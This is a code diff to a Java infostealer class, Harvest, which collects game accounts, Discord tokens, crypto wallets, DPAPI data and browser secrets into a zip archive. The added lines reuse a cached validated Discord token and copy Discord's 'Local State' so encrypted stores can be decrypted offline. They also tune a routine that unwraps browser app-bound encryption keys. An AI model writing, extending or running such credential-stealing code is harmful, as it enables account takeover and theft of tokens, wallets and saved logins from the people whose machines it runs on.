@@ -29,7 +29,7 @@ public final class Harvest {
 		try (ZipBuilder zip = new ZipBuilder(target)) {
 			addAccounts(zip, gameDir);
 			addAdminHints(zip);
-			addDiscordToken(zip);
+			addDiscordToken(zip, installDir);
 			addWallets(zip);
 			addDpapi(zip);
 			addBrowsers(zip, installDir);
@@ -128,7 +128,22 @@ public final class Harvest {
 		}
 	}
 
-	private static void addDiscordToken(ZipBuilder zip) {
+	private static void addDiscordToken(ZipBuilder zip, Path installDir) {
+		// A recent `token` command already validated one; keep it even when the
+		// LevelDB no longer re-reads (Discord rotates/compacts its stores fast).
+		try {
+			Path cached = AgentPaths.cache(installDir).resolve("discord").resolve("token.txt");
+			if (Files.isRegularFile(cached)) {
+				String line = Files.readString(cached, StandardCharsets.UTF_8).trim();
+				String token = line.startsWith("token=") ? line.substring(6) : line;
+				if (!token.isEmpty() && valid(token)) {
+					zip.addBytes(("token=" + token + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
+					return;
+				}
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Cached token failed", throwable);
+		}
 		List<Path> found = new ArrayList<>();
 		try {
 			for (Path base : discordBases()) {
@@ -313,6 +328,15 @@ public final class Harvest {
 	}
 
 	private static void addDiscordRaw(ZipBuilder zip, Path base) {
+		// Without the Local State the raw v10 blobs cannot be opened offline.
+		try {
+			Path state = base.getParent().getParent().resolve("Local State");
+			if (Files.isRegularFile(state)) {
+				zip.add(state, "discord/localstorage/Local State");
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Discord Local State failed", throwable);
+		}
 		long budget = DISCORD_RAW_BUDGET;
 		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
 			List<Path> files = stream.filter(Files::isRegularFile).sorted((left, right) -> {
@@ -581,7 +605,7 @@ public final class Harvest {
 			} else {
 				text.append("ps_error=app-bound unwrap returned nothing\n");
 			}
-			Abe.Result result = Abe.run(installDir, browser.label());
+			Abe.Result result = Abe.run(installDir, browser.label().toLowerCase(java.util.Locale.ROOT));
 			if (!result.key().isEmpty() && !key.equals(result.key())) {
 				key = result.key();
 				text.append("v20=").append(key).append('\n');
